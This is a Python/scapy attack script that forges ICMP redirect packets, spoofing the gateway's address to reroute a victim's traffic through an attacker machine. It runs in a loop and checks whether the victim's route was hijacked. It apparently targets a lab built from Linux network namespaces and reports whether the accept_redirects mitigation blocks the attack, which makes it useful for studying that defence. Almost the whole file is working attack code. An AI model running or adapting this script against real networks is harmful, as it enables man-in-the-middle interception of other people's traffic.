#!/usr/bin/python3
from scapy.all import IP, ICMP, UDP, send, Raw
import sys
import time
import logging
import subprocess

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def send_icmp_redirect(victim_ip, gateway_ip, attacker_ip, target_ip):
    """Send ICMP redirect packets to manipulate victim's routing"""
    logging.info(f"Starting ICMP redirect attack...")
    
    # Modify the packet code to make it more aggressive
    packet_code = f"""
from scapy.all import *

# Create ICMP redirect packet
redirect = IP(
    src='{gateway_ip}',    # Pretend to be the gateway
    dst='{victim_ip}',     # Target the victim
    ttl=64
)/ICMP(
    type=5,               # ICMP redirect
    code=1,               # for host
    gw='{attacker_ip}'    # Redirect to attacker
)/IP(
    src='{victim_ip}',    # Original packet source
    dst='{target_ip}',    # Original packet destination
    ttl=64
)/ICMP(
    type=8,              # Echo request
    code=0               # Echo request code
)

# More aggressive packet sending
for i in range(20):  # Increased number of attempts
    # First, generate some legitimate traffic
    ping_pkt = IP(src='{victim_ip}', dst='{target_ip}')/ICMP(type=8, code=0)
    send(ping_pkt, iface='a-eth0', verbose=0)
    time.sleep(0.01)  # Shorter delay
    
    # Then immediately send the redirect
    send(redirect, iface='a-eth0', verbose=0)
    time.sleep(0.01)  # Shorter delay
    
    # Send another ping to trigger the new route
    send(ping_pkt, iface='a-eth0', verbose=0)
    time.sleep(0.01)  # Shorter delay
"""

    try:
        # Prepare the environment
        prep_commands = [
            f"sudo ip netns exec victim ip route flush cache",
            f"sudo ip netns exec victim ip route del {target_ip} via {attacker_ip} 2>/dev/null || true",
            f"sudo ip netns exec victim ip route add default via {gateway_ip}",
            "sudo ip netns exec attacker sysctl -w net.ipv4.ip_forward=1"
        ]
        
        for cmd in prep_commands:
            subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        while True:
            try:
                # Check if ICMP redirects are enabled
                redirect_status = subprocess.run(
                    "sudo ip netns exec victim sysctl -n net.ipv4.conf.all.accept_redirects",
                    shell=True, capture_output=True, text=True
                ).stdout.strip()

                if redirect_status == "1":
                    logging.info("🎯 ICMP redirects enabled - attempting attack")
                    
                    # Generate initial traffic
                    subprocess.run(f"sudo ip netns exec victim ping -c 2 -W 1 {target_ip}", 
                                shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    
                    # Send redirect packets
                    with open('/tmp/packet.py', 'w') as f:
                        f.write("from scapy.all import *\n")
                        f.write(packet_code)
                    subprocess.run("sudo ip netns exec attacker python3 /tmp/packet.py", 
                                shell=True, stderr=subprocess.DEVNULL)
                    logging.info(f"📤 Sent ICMP redirect to {victim_ip}")
                    
                    # WSL-friendly route checks
                    def check_route_hijacked():
                        try:
                            # Check main route
                            route_check = subprocess.run(
                                f"sudo ip netns exec victim ip route get {target_ip}",
                                shell=True, capture_output=True, text=True
                            ).stdout.strip()
                            
                            # Check route cache
                            cache_check = subprocess.run(
                                "sudo ip netns exec victim ip route show cache",
                                shell=True, capture_output=True, text=True
                            ).stdout.strip()
                            
                            # Simple string checks that work reliably in WSL
                            if any([
                                f"via {attacker_ip}" in route_check,
                                "<redirected>" in cache_check,
                                attacker_ip in route_check,
                                attacker_ip in cache_check
                            ]):
                                return True
                            return False
                        except Exception as e:
                            logging.error(f"Route check error: {e}")
                            return False

                    # Check if route was modified
                    if check_route_hijacked():
                        logging.info("✅ Attack successful - Route hijacked!")
                        subprocess.run("sudo ip netns exec victim ip route show", shell=True)
                        subprocess.run("sudo ip netns exec victim ip route show cache", shell=True)
                        time.sleep(1)
                        # Continue attack instead of exiting
                    else:
                        logging.warning("⚠️ Route not yet modified, continuing attack...")
                
                else:
                    logging.info("🛡️ ICMP redirects disabled - attack blocked by mitigations")
                    logging.info("❌ Attack blocked - ICMP redirects disabled")
                    subprocess.run("sudo ip netns exec victim ip route show", shell=True)
                
            except Exception as e:
                logging.error(f"Error during attack: {e}")
            
            time.sleep(1)
            
    except KeyboardInterrupt:
        logging.info("Attack stopped by user")
        subprocess.run("rm -f /tmp/packet.py", shell=True)

if __name__ == "__main__":
    if len(sys.argv) != 5:
        print("Usage: ./icmp_redirect_attack.py <victim_ip> <gateway_ip> <attacker_ip> <target_ip>")
        print("Example: ./icmp_redirect_attack.py 192.168.1.10 192.168.1.1 192.168.1.20 8.8.8.8")
        sys.exit(1)
    
    victim_ip = sys.argv[1]
    gateway_ip = sys.argv[2]
    attacker_ip = sys.argv[3]
    target_ip = sys.argv[4]

    send_icmp_redirect(victim_ip, gateway_ip, attacker_ip, target_ip)